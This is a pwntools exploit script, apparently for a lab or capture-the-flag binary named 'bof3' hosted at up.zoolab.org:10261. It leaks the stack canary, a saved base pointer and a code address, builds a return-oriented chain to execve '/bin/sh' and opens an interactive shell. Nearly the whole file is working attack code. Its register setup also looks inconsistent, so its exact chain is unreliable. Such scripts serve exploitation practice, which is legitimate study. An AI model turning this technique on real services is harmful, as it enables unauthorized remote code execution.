#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

exe = './bof3'
elf = ELF(exe)
rop = ROP(elf)
off_main = elf.symbols[b'main']
base = 0
qemu_base = 0

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', 10261)


# pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
# syscall = rop.find_gadget(['syscall'])[0]



r.recvuntil(b"name? ")
payload = b'A' * 41
r.send(payload)
response = r.recvline().split(b'A' * 41)[1][:7].rstrip(b'\n')
canary = b'\x00' + response
print(b"canary: " + canary)

r.recvuntil(b"number? ")
payload = b'A' * 48
r.send(payload)
response = r.recvline().split(b'A' * 48)[1][:8].rstrip(b'\n')
rbp = u64(response.ljust(8, b'\x00'))
buffer_addr = rbp - 0x30

r.recvuntil(b"name? ")
payload = b'A' * 56
r.send(payload)
response = r.recvline().split(b'A' * 56)[1][:8].rstrip(b'\n')
addr = u64(response.ljust(8, b'\x00'))
print(addr)

pop_rdx = 0x000000000008dd8b  + addr - 0x8ad0        # pop rdx ; pop rbx ; ret
pop_rsi = 0x00000000000111ee  + addr - 0x8ad0        # pop rsi ; ret
pop_rdi = 0x000000000000917f  + addr - 0x8ad0        # pop rdi ; ret
syscall = 0x0000000000008f34  + addr - 0x8ad0        # syscall

rop.raw(pop_rdi)
rop.raw(buffer_addr)

rop.raw(pop_rdx)                       
rop.raw(0x3b)
rop.raw(0x0)               
rop.raw(b'AAAA')
rop.raw(pop_rsi)
rop.raw(0x0)
rop.raw(syscall)


print(rop.dump())



r.recvuntil(b"Leave your message: ")
payload = b'/bin/sh\0'
payload += b'A' * (40 - len(payload))
rbp = b'A' * 8
input()
r.send(payload + canary + rbp + rop.chain())

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
